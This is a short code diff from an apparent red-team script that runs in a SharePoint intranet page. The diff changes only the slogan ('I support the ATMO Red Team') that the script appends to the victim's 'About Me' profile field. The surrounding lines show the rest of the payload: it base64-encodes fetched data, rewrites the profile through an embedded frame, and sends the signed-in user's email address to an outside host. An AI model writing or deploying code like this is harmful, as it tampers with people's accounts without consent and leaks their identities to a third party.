@@ -24,7 +24,7 @@ setTimeout(function() {
             success: function (data) {
                 var payload = btoa(data);
                 
-                var profile_payload = $("#edit_profile").contents().find('#txtAboutMe').val() + "I support the ATMO Red Team";
+                var profile_payload = $("#edit_profile").contents().find('#txtAboutMe').val() + " I support the ATMO Red Team. ";
                 $("#edit_profile").contents().find('#txtAboutMe').val(profile_payload);     
 
                 $.get('//public.cgi.com/~intranet-profile/profile.js?activating_profile=' + _spPageContextInfo.userEmail, function( data ) {});
